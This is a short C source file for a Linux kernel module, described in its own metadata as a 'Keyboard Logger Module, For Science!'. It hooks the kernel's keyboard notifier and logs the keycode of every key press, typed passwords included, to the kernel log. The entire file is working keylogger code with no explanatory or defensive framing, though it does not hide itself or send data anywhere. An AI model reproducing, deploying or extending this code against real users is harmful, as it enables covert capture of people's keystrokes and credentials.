#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/input.h>

// Module information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Blake Drizzle");
MODULE_DESCRIPTION("Keyboard Logger Module, For Science!");

// Event handler function
int keyboard_event_notifier(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    // Log only key down events
    if (code == KBD_KEYCODE && param->down) {
        printk(KERN_INFO "Keycode %i %s\n", param->value, param->down ? "down" : "up");
    }

    return NOTIFY_OK;
}

// Define a notifier_block
static struct notifier_block keyboard_nb = {
    .notifier_call = keyboard_event_notifier
};

// Module initialization
static int __init keyboard_logger_init(void) {
    register_keyboard_notifier(&keyboard_nb);
    printk(KERN_INFO "Keyboard logger module loaded\n");
    return 0;
}

// Module cleanup
static void __exit keyboard_logger_exit(void) {
    unregister_keyboard_notifier(&keyboard_nb);
    printk(KERN_INFO "Keyboard logger module unloaded\n");
}

module_init(keyboard_logger_init);
module_exit(keyboard_logger_exit);

